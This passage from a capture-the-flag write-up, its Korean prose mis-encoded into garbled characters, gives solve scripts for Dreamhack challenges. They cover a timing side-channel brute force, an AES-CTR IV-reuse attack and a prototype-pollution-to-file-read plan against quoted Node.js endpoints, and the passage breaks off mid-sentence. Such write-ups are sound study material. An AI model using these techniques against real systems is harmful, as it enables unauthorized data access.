</pre></table></code></div></div><p>16ë°”ì´íŠ¸ì˜ ì…ë ¥ì„ ë°›ê³  í•´ë‹¹ ì…ë ¥ì„ 4ë°”ì´íŠ¸ì”© ë¸”ë¡ìœ¼ë¡œ ìª¼ê°  í›„,<br /> ëœë¤í•œ ìˆœì„œì˜ ë¸”ë¡ë“¤ì„ ì•ì—ì„œë¶€í„° ìˆœì°¨ì ìœ¼ë¡œ <code class="language-plaintext highlighter-rouge">secret.hex()</code>ì˜ ë™ì¼í•œ ì¸ë±ìŠ¤ì™€ ë¹„êµí•œë‹¤.</p><p>ì´ë•Œ ë¹„êµë¥¼ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” kí•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ë©´ ë¬´ìˆ˜íˆ ë§ì€ sha512ì˜ ìš”ì²­ì´ ìŸì•„ì§€ê³ <br /> pythonì€ ê° ë°”ì´íŠ¸ë¥¼ ë¹„êµí•˜ëŠ” ë°ì— ê½¤ ë§ì€ ì‹œê°„ì´ ê±¸ë¦°ë‹¤.</p><p>ë”°ë¼ì„œ ì…ë ¥ì„ ë‚ ë ¸ì„ ë•Œ ì•„ì›ƒí’‹ì´ ëŒì•„ì˜¤ê¸°ê¹Œì§€<br /> â€œì¢€ ì˜¤ë˜ ê±¸ë¦¬ëŠ” ê±° ê°™ì€ë°?â€<br /> ë¼ëŠ” ìƒê°ì´ ë“¤ë©´ ë§ëŠ” ì…ë ¥ì„ ë‚ ë¦° ê²ƒì´ë‹¤.</p><p>ê·¸ë˜ì„œ ìë™ìœ¼ë¡œ ì…ë ¥ì„ ë§Œë“¤ê³ , ì‘ë‹µì‹œê°„ì„ ê¸°ë°˜ìœ¼ë¡œ ë§ëŠ” ê²ƒ ê°™ì€ ë¬¸ìë¥¼ ê³¨ë¼ì£¼ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ë ¤ê³  í–ˆì§€ë§Œ<br /> ì‘ë‹µì‹œê°„ì„ ê²°ì •í•˜ëŠ” ë³€ìˆ˜ê°€ ë„ˆë¬´ ë§ì•˜ê¸° ë–„ë¬¸ì—, ì´ë¥¼ ì •êµí•˜ê²Œ ë§Œë“œëŠ” ê²ƒì´ ì–´ë ¤ì›Œ ì‘ë‹µì‹œê°„ì„ ë¿Œë ¤ì£¼ê³  ì§ì ‘ ëˆˆìœ¼ë¡œ ë³´ê³  ê²°ì •í•  ìˆ˜ ìˆê²Œë” ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì˜€ë‹¤.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
<span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'host1.dreamhack.games'</span><span class="p">,</span> <span class="mi">9347</span><span class="p">)</span>
<span class="c1"># p = process(['python3', '-u', './chal.py'])
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="s">''</span>
<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
    <span class="n">u</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">(</span><span class="s">'0123456789abcdef'</span><span class="p">[:]):</span>
        <span class="n">g</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">):</span>
            <span class="n">pay</span> <span class="o">=</span> <span class="p">(</span><span class="n">r</span><span class="o">+</span><span class="n">i</span><span class="p">)[:</span><span class="mi">4</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span>
            <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
            <span class="n">a</span> <span class="o">=</span> <span class="n">time</span><span class="p">()</span>
            <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
            <span class="n">b</span> <span class="o">=</span> <span class="n">time</span><span class="p">()</span>
            <span class="n">g</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span> <span class="o">-</span> <span class="n">a</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">g</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:],</span><span class="n">i</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><p>ê°€ì¥ ì²˜ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ëŒë¦´ ë•Œì—”<br /> ë‹¤ë¥¸ ë¬¸ìë“¤ ëŒ€ë¹„ ì‘ë‹µ ì‹œê°„ì´ ê· ì¼í•˜ì§€ ì•Šì€ ë¬¸ì 4ê°œê°€ ì¡´ì¬í•œë‹¤.</p><p>ì´ëŠ” í•´ë‹¹ ë¬¸ìë“¤ì„ ë¹„êµí–ˆì„ ë•Œ í†µê³¼ê°€ ë˜ì–´<br /> ë‹¤ìŒ ë°”ì´íŠ¸ì— ëŒ€í•œ ë¹„êµê°€ ì´ë£¨ì–´ì¡Œê¸° ë•Œë¬¸ì— ì‘ë‹µì‹œê°„ì˜ ì°¨ì´ê°€ ë°œìƒí•œ ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤.<br /> ë”°ë¼ì„œ í•´ë‹¹ 4ê°œì˜ ë¬¸ìê°€ ê° ë¸”ë¡ì˜ ì²«ë²ˆì§¸ ê¸€ìê°€ ëœë‹¤.</p><p>ì´í›„ ê° ë¸”ë¡ì˜ ì²«ë²ˆì§¸ ê¸€ìë¥¼ rì— ë„£ì–´ ì‹¤í–‰í•œë‹¤.</p><p>ì´ë•Œ, ëœë¤í•œ ë¹„êµ ìˆœì„œ ë•Œë¬¸ì—<br /> ì…ë ¥ìœ¼ë¡œ ë³´ë‚¸ ë¬¸ìì—´ì´ í¬í•¨ëœ ë¸”ë¡ì´ <code class="language-plaintext highlighter-rouge">ë¹„êµë˜ì§€ ì•Šê³  ëë‚œ ê²ƒ ê°™ì•„ë³´ì´ëŠ” ì‹œê°„</code> ê³¼<br /> ì…ë ¥ìœ¼ë¡œ ë³´ë‚¸ ë¬¸ìì—´ì´ í¬í•¨ëœ ë¸”ë¡ì´ <code class="language-plaintext highlighter-rouge">ë¹„êµë˜ê³  ëë‚œ ê²ƒ ê°™ì•„ë³´ì´ëŠ” ì‹œê°„</code>ì˜ ì°¨ê°€<br /> ì—¬ëŸ¬ ë³€ìˆ˜ë¥¼ ê³ ë ¤í•˜ê³ ë„ ë‹¤ë¥¸ ë¬¸ì ëŒ€ë¹„ í° ë¬¸ì í•˜ë‚˜ê°€ ì¡´ì¬í•œë‹¤.</p><p>í•´ë‹¹ ë¬¸ì ì—­ì‹œ ìµœì´ˆ ì‹¤í–‰ê³¼ ê°™ì€ ì´ìœ ë¡œ ì˜¬ë°”ë¥¸ ë¬¸ìë¼ê³  ìƒê°í•˜ì—¬ r ë’¤ì— ì¶”ê°€í•œë‹¤.</p><p>ìœ„ ê³¼ì •ì„ ë°˜ë³µí•˜ë©´ ê°ê°ì˜ ë¸”ë¡ë“¤ì„ êµ¬í•  ìˆ˜ ìˆë‹¤.<br /> ì´í›„ ë¸”ë¡ë“¤ì˜ ìˆœì„œë¥¼ ì ë‹¹íˆ ì•Œì•„ë‚´ë©´ í”Œë˜ê·¸ë¥¼ íœ™ë“í•  ìˆ˜ ìˆë‹¤.</p><h2 id="o-interchange---crypto">O. Interchange - Crypto<a href="#o-interchange---crypto" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>ìš´ìš©ë°©ì‹ ë³„ AES cipher 3ê°œê°€ ì£¼ì–´ì§€ê³ , ì›í•˜ëŠ” ë°©ì‹ì— encrypt ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆëŠ” ë¬¸ì œì´ë‹¤.</p><p>CTRë¡œ encryptë¥¼ í•  ë•Œ, ì•”í˜¸í™”ë¥¼ í•  ë•Œë§ˆë‹¤ ë™ì¼í•œ ivë¥¼ ê°–ëŠ” cipherë¥¼ ê³„ì† ìƒì„±í•˜ê¸° ë•Œë¬¸ì—<br /> ì•„ì£¼ ê¸´ <code class="language-plaintext highlighter-rouge">\x00</code>ì„ ì•”í˜¸í™” í•œ ê°’ê³¼ í”Œë˜ê·¸ë¥¼ ì•”í˜¸í™” í•œ ê°’ì„ xorí•˜ì—¬ í”Œë˜ê·¸ë¥¼ íœ™ë“í•˜ì˜€ë‹¤.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'host1.dreamhack.games'</span><span class="p">,</span> <span class="mi">8930</span><span class="p">)</span>
<span class="c1"># p = process(['python3','-u','chal.py'])
</span>
<span class="k">while</span> <span class="ow">not</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">endswith</span><span class="p">(</span><span class="sa">b</span><span class="s">'CTR'</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x1000</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span>

<span class="k">print</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">key</span><span class="p">)[:])</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="q-nss---web">Q. NSS - Web<a href="#q-nss---web" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>í”„ë¡œí† íƒ€ì… í´ë£¨ì…˜ì„ í†µí•´ LFIë¡œ ì—°ê²°ì‹œí‚¤ëŠ” ì»¨ì…‰ì˜ ë¬¸ì œì´ë‹¤.</p><p>ê°œì¸ì ìœ¼ë¡œ ì˜¤ëœë§Œì— ì¬ë¯¸ìˆê²Œ í‘¼ ì›¹ ë¬¸ì œì¸ ê²ƒ ê°™ë‹¤.</p><p>ìš°ì„  ì„œë²„ì—ëŠ” í¬ê²Œ ì„¸ ê°€ì§€ì˜ ê°ì²´ê°€ ì¡´ì¬í•œë‹¤.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>Users = {}
Users[userid] = {
    userid : "{userid}",
    pass : "{hashed password}",
    workspaces : WORKSPACES,
    base_dir: "{unique tmp path}"
}

WORKSPACES = {}
WORKSPACES[workspace_name] = {}

tokens = {}
tokens[token] = {
    owner: "{userid}",
    expire: EXPIRE_TIME
}
</pre></table></code></div></div><p>ê·¸ë¦¬ê³  endpoint ì¤‘ì— ì•„ë˜ì™€ ê°™ì€ ë™ì‘ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì´ ìˆë‹¤.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_name</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_path</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\.</span><span class="sr">/g</span><span class="p">,</span><span class="dl">''</span><span class="p">)</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">f_content</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file_content</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid id or token</span><span class="dl">"</span><span class="p">});</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span> <span class="o">||</span> <span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name or path</span><span class="dl">"</span><span class="p">});</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">write_b64_file</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">),</span> <span class="nx">f_content</span><span class="p">))</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>

    <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f_path</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>í•¨ìˆ˜ì˜ ë‚´ìš©ì„ ìš”ì•½í•´ì„œ <code class="language-plaintext highlighter-rouge">users[userid].workspaces[ws_name][f_name]</code>ì— ì›í•˜ëŠ” ë¬¸ìì—´ì„ ë„£ì„ ìˆ˜ ìˆë‹¤.<br /> ì´ ë•Œ, ws_nameì„ ê²€ì¦í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ <code class="language-plaintext highlighter-rouge">workspace['__proto__'][f_name]</code>í˜•íƒœë¡œ ë§Œë“¤ ìˆ˜ ìˆë‹¤.<br /> ë”°ë¼ì„œ í•´ë‹¹ í•¨ìˆ˜ì—ì„œ prototype pollutionì´ ë°œìƒí•œë‹¤.</p><p>PPë¥¼ ì´ìš©í•´ì„œ ì´ë¤„ì•¼í•  ëª©í‘œëŠ” ì•„ë˜ í•¨ìˆ˜ë¥¼ í†µí•´ <code class="language-plaintext highlighter-rouge">/usr/src/app/flag</code>ë¥¼ ì½ëŠ” ê²ƒì´ë‹¤.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/users/:userid/:ws/:fname</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">userid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">userid</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">ws_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">ws</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">f_name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">fname</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>
    <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">token</span> <span class="o">||</span> <span class="dl">""</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">userid</span> <span class="o">||</span> <span class="o">!</span><span class="nx">token</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid userid or token</span><span class="dl">"</span><span class="p">});</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">check_session</span><span class="p">(</span><span class="nx">userid</span><span class="p">,</span> <span class="nx">token</span><span class="p">))</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to validate session</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">users</span><span class="p">[</span><span class="nx">userid</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">ws_name</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid workspace name</span><span class="dl">"</span><span class="p">});</span>
    
    <span class="kd">const</span> <span class="nx">workspace</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">workspaces</span><span class="p">[</span><span class="nx">ws_name</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">workspace</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find workspace</span><span class="dl">"</span><span class="p">});</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_name</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid file name</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">f_path</span> <span class="o">=</span> <span class="nx">workspace</span><span class="p">[</span><span class="nx">f_name</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">f_path</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Failed to find file</span><span class="dl">"</span><span class="p">});</span>

    <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="nx">read_b64_file</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">base_dir</span><span class="p">,</span> <span class="nx">f_path</span><span class="p">));</span>
    <span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">content</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">err</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Internal server error</span><span class="dl">"</span><span class="p">});</span>

    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">ok</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">file_content</span><span class="p">:</span> <span class="nx">content</span><span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>ê·¸ë˜ì„œ ë‚´ê°€ ìƒê°í•œ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì•„ë˜ì™€ ê°™ì•˜ë‹¤.</p><ol><li>useridë¡œ <code class="language-plaintext highlighter-rouge">__proto__</code>ë¥¼ ì¤˜ì„œ <code class="language-plaintext highlighter-rouge">users[__proto__]</code>ë¥¼ ë¶€ë¥´ê²Œ í•œë‹¤.<li>ws_nameë„ <code class="language-plaintext highlighter-rouge">__proto__</code>ë¥¼ ì¤˜ì„œ <code class="language-plaintext highlighter-rouge">users[__proto__].workspaces[__proto__]</code>ë¥¼ ë¶€ë¥´ê²Œ í•œë‹¤.<li>f_nameìœ¼ë¡œ ì•„ë¬´ê±°ë‚˜ ì¤˜ì„œ <code class="language-plaintext highlighter-rouge">user[__proto__].workspaces[__proto__][f_name]</code>ì´ <code class="language-plaintext highlighter-rouge">flag</code>ë¥¼ ë°˜í™˜í•˜ê²Œ í•œë‹¤.<li>PPë¡œ <code class="language-plaintext highlighter-rouge">user[__proto__].base_dir</code>ì´ <code class="language-plaintext highlighter-rouge">/usr/src/app</code>ì„ ë°˜í™˜í•˜ê²Œ í•œë‹¤.</ol><p>ë”°ë¼ì„œ í˜„ì¬ê¹Œì§€ì˜ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ 